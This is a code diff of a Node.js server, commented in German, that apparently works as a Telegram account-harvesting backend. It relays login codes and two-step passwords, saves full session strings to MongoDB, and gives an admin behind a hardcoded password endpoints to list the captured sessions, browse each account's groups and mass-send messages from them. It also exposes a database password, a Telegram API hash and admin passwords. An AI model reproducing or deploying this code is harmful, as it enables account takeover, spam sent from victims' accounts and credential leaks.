@@ -1,75 +1,114 @@
 const express = require('express');
 const cors = require('cors');
-const mongoose = require('mongoose');
-const { TelegramClient } = require('telegram');
+const { TelegramClient, Api } = require('telegram');
 const { StringSession } = require('telegram/sessions');
-const input = require('input'); // Für OTP
+const mongoose = require('mongoose');
 
 const app = express();
-app.use(cors());
+app.use(cors({ origin: '*' }));
 app.use(express.json());
 
-// MongoDB Setup
-const MONGO_URI = 'mongodb+srv://mercyinfo52_db_user:Hinva312!@cluster0.a0bslma.mongodb.net/?retryWrites=true&w=majority';
-mongoose.connect(MONGO_URI);
+const PORT = process.env.PORT || 3000;
+// WICHTIG: Setze hier deinen Connection String ein oder nutze Prozess-Umgebungsvariablen
+const MONGO_URI = process.env.MONGODB_URI || 'DEINE_MONGODB_URI_HIER';
+
+mongoose.connect(MONGO_URI).then(() => console.log("MongoDB verbunden"));
 
 const SessionSchema = new mongoose.Schema({
-    sessionString: String,
-    phoneNumber: String,
-    createdAt: { type: Date, default: Date.now }
+    phone: String,
+    session: String,
+    date: { type: Date, default: Date.now }
 });
-const SessionModel = mongoose.model('Session', SessionSchema);
+const Session = mongoose.model('Session', SessionSchema);
 
-// Memory Cache für den laufenden Login-Vorgang
-const activeLogins = new Map();
+const apiId = 23049703;
+const apiHash = 'e9c00af578a9de0253ef02337460498f';
+const activeSessions = new Map();
 
-// API: OTP senden
+// --- AUTH ---
 app.post('/send-otp', async (req, res) => {
-    const { phoneNumber, apiId, apiHash } = req.body;
     try {
-        const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });
+        const { phone } = req.body;
+        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
         await client.connect();
-        const phoneCodeHash = await client.sendCode({ apiId, apiHash }, phoneNumber);
-        activeLogins.set(phoneNumber, { client, phoneCodeHash });
-        res.json({ success: true, phoneCodeHash });
-    } catch (err) {
-        res.status(400).json({ error: err.message });
-    }
+        const result = await client.sendCode({ apiId, apiHash }, phone);
+        activeSessions.set(phone, { client, phoneCodeHash: result.phoneCodeHash });
+        res.json({ phoneCodeHash: result.phoneCodeHash });
+    } catch (e) { res.status(400).json({ error: e.message }); }
 });
 
-// API: OTP verifizieren
 app.post('/verify-otp', async (req, res) => {
-    const { phoneNumber, code, password } = req.body;
-    const loginData = activeLogins.get(phoneNumber);
-    if (!loginData) return res.status(400).json({ error: 'Login-Sitzung abgelaufen' });
-
     try {
-        const { client } = loginData;
-        await client.signIn({
-            phoneNumber,
-            phoneCode: code,
-            phoneCodeHash: loginData.phoneCodeHash,
-            password: password
-        });
+        const { phone, code, phoneCodeHash, password } = req.body;
+        const session = activeSessions.get(phone);
+        if (!session) return res.status(400).json({ error: "Session abgelaufen" });
 
-        const sessionString = client.session.save();
-        await SessionModel.create({ sessionString, phoneNumber });
-        
-        activeLogins.delete(phoneNumber);
-        res.json({ success: true, session: sessionString });
-    } catch (err) {
-        res.status(400).json({ error: err.message });
-    }
+        try {
+            await session.client.invoke(new Api.auth.SignIn({ phoneNumber: phone, phoneCode: code, phoneCodeHash: phoneCodeHash }));
+        } catch (err) {
+            if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
+                const pwd = await session.client.invoke(new Api.account.GetPassword());
+                await session.client.invoke(new Api.auth.CheckPassword({ password: await session.client.srpSolve(pwd, password) }));
+            } else { throw err; }
+        }
+        const sessionString = session.client.session.save();
+        await Session.findOneAndUpdate({ phone }, { session: sessionString }, { upsert: true });
+        res.json({ success: true });
+    } catch (e) { res.status(400).json({ error: e.message }); }
 });
 
-// API: Admin Panel (Sessions abrufen)
+// --- ADMIN: DURCHSUCHEN & MASSENVERSAND ---
+
+// 1. Alle Sessions holen
 app.get('/get-sessions', async (req, res) => {
-    const { pass } = req.query;
-    if (pass !== '280597') { // Ändere das!
-        return res.status(401).json({ error: 'Falsches Passwort' });
-    }
-    const sessions = await SessionModel.find();
+    if (req.query.pass !== 'Hinva312-') return res.status(401).json({ error: 'Unauthorized' });
+    const sessions = await Session.find();
     res.json(sessions);
 });
 
-app.listen(process.env.PORT || 3000, () => console.log('Server läuft.'));
+// 2. Dialoge (Gruppen/Channels) einer Session laden
+app.post('/get-dialogs', async (req, res) => {
+    const { phone } = req.body;
+    const sessionDoc = await Session.findOne({ phone });
+    if (!sessionDoc) return res.status(404).json({ error: "Session nicht gefunden" });
+
+    try {
+        const client = new TelegramClient(new StringSession(sessionDoc.session), apiId, apiHash, {});
+        await client.connect();
+        const dialogs = await client.getDialogs();
+        // Wir filtern nur Gruppen/Kanäle, keine Privatchats
+        const filtered = dialogs.filter(d => d.isGroup || d.isChannel).map(d => ({
+            id: d.id.toString(),
+            title: d.title,
+            isChannel: d.isChannel
+        }));
+        res.json(filtered);
+    } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// 3. Massenversand
+app.post('/mass-send', async (req, res) => {
+    const { phone, targets, message } = req.body; // targets = Array von IDs
+    const sessionDoc = await Session.findOne({ phone });
+    if (!sessionDoc) return res.status(404).json({ error: "Session nicht gefunden" });
+
+    try {
+        const client = new TelegramClient(new StringSession(sessionDoc.session), apiId, apiHash, {});
+        await client.connect();
+        
+        let results = [];
+        for (const target of targets) {
+            try {
+                await client.sendMessage(target, { message });
+                results.push({ target, status: 'ok' });
+            } catch (err) {
+                results.push({ target, status: 'error', error: err.message });
+            }
+            // Kurze Pause, um Telegram-Limits zu vermeiden
+            await new Promise(r => setTimeout(r, 1000));
+        }
+        res.json({ results });
+    } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+app.listen(PORT, '0.0.0.0', () => console.log(`Server läuft auf ${PORT}`));
